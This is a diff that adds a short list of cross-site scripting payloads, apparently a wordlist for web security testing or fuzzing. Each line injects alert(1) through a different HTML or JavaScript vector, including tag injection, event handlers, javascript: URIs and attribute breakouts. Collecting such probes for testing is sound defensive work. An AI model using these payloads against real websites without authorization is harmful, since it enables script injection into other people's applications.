@@ -1,0 +1,17 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+"><script>alert(1)</script>
+<body onload=alert(1)>
+javascript:alert(1)
+<iframe src="javascript:alert(1)">
+'"><img src=x onerror=alert(1)>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<details open ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+<marquee onstart=alert(1)>
+<select autofocus onfocus=alert(1)>
+<input autofocus onfocus=alert(1)>
+<audio src=x onerror=alert(1)>
+<img onanimationstart=alert(1) style=animation-name:x src=x>
+<div onpointerenter=alert(1) style=width:100%;height:100%>x</div>
